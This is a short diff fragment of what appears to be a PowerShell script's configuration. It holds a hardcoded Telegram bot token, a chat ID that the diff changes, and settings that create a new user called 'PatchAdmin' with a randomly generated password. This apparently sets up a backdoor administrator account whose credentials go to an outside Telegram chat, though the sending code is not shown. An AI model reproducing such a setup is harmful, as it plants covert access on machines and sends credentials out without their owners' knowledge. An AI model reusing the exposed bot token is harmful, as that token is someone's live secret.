@@ -4,7 +4,7 @@
 
 # Config
 $TelegramBotToken = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"  # BotFather token
-$TelegramChatID = "6023417944"      # Your chat ID
+$TelegramChatID = "-1002050197092"      # Your chat ID
 $NewUser = "PatchAdmin"             # New user
 $NewPass = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })  # Random 12-char password
 
